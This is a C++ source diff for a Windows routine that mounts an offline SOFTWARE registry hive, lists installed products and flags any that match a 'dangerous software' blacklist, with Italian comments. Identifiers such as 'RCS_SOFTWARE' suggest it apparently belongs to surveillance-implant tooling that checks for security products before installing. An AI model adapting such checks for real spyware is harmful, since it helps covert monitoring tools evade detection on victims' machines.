@@ -1,6 +1,8 @@
 #include "stdafx.h"
-#include "Functions_OS.h"
 #include "commons.h"
+#include "Functions_OS.h"
+#include "Functions_Users.h"
+#include "Functions_RCS.h"
 
 BOOL Time1970ToSystemTime(DWORD toffset, SYSTEMTIME *sys_time)
 {
@@ -57,7 +59,7 @@ BOOL WIN_IsSupported(os_struct_t *os_info)
 }
 
 // Torna TRUE se c'e' un software pericoloso
-BOOL IsBlackListedSoftware(WCHAR *drive_letter)
+BOOL WIN_IsBlackListedSoftware(os_struct_t *os_struct)
 {
 	HKEY hKeyUninstall = NULL, hKeyProgram = NULL;
 	DWORD dwordval, index, len;
@@ -69,14 +71,16 @@ BOOL IsBlackListedSoftware(WCHAR *drive_letter)
 	DWORD i;
 	BOOL ret_val = FALSE;
 
+	ZeroMemory(os_struct->bl_software, sizeof(os_struct->bl_software));
+
 	// Monta l'hive SOFTWARE
 	swprintf_s(system_root, MAX_PATH, L"windows\\system32");
-	swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", drive_letter, system_root, L"\\config\\software");
+	swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", os_struct->drive, system_root, L"\\config\\software");
 	
 	hfile = CreateFile(software_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE) {
 		swprintf_s(system_root, MAX_PATH, L"winnt\\system32");
-		swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", drive_letter, system_root, L"\\config\\software");
+		swprintf_s(software_hive_path, MAX_PATH, L"%s%s%s", os_struct->drive, system_root, L"\\config\\software");
 		hfile = CreateFile(software_hive_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 		if (hfile == INVALID_HANDLE_VALUE)
 			return TRUE;
@@ -125,10 +129,10 @@ BOOL IsBlackListedSoftware(WCHAR *drive_letter)
 					wcsncat_s(product, sizeof(product) / sizeof(product[0]), L")", _TRUNCATE);
 				}
 
-				// if (IsDangerous(product) 
-				//		ret_val = TRUE;
-				MessageBox(NULL, product, L"Product", MB_OK);
-				
+				if (IsDangerousString(product)) {
+					ret_val = TRUE;				
+					_snwprintf_s(os_struct->bl_software, sizeof(os_struct->bl_software)/sizeof(os_struct->bl_software[0]), _TRUNCATE, L"%s", product);
+				}
 			}
 		} while(0);
 
@@ -207,12 +211,11 @@ BOOL RecognizeWindowsOS(WCHAR *drive_letter, os_struct_t *os_struct)
 	}
 
 	os_struct->arch = WIN_GetArch(os_struct);
+	os_struct->is_blacklisted = WIN_IsBlackListedSoftware(os_struct);
 	os_struct->is_supported = WIN_IsSupported(os_struct); // Va chiamata per ultima...
 
 	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SOFTWARE\\");
 	RegUnLoadKey(HKEY_LOCAL_MACHINE, L"RCS_SYSTEM\\");
-
-	//IsBlackListedSoftware(drive_letter);
 
 	return TRUE;
 }
